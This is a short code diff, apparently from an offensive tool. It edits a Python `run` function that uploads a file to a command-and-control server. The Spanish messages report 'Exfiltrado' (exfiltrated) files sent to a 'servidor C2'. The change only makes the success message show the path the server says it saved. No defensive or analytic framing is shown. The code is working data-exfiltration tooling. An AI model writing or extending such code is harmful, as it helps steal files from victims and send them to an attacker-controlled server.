@@ -60,7 +60,8 @@ def run(args: str) -> tuple[int, str, str]:
             headers={"Content-Type": "application/json"},
         )
         if resp.status_code == 200:
-            return 0, f"Exfiltrado: {filename} ({size} bytes) → servidor C2", ""
+            saved = resp.json().get("saved", "?")
+            return 0, f"Exfiltrado: {filename} ({size} bytes) → {saved}", ""
         return 1, "", f"servidor rechazó el archivo: HTTP {resp.status_code}"
     except Exception as exc:
         return 1, "", f"error de conexión al servidor: {exc}"
